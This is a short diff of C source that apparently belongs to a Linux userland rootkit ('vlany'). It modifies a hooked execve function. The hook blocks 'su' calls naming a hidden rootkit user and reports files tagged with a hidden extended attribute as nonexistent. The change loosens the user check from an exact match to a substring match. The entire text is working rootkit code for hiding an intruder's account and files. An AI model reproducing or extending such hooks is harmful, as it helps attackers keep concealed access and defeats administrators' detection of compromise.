@@ -211,7 +211,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
     }
 
     char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
-    if(strstr(filename, "su") && !strcmp(argv[1], vlany_user)) { CLEAN(vlany_user); errno = EIO; return -1; }
+    if(strstr(filename, "su") && strstr(argv[1], vlany_user)) { CLEAN(vlany_user); errno = EIO; return -1; }
     CLEAN(vlany_user);
 
     if(hidden_xattr(filename)) { errno = ENOENT; return -1; }
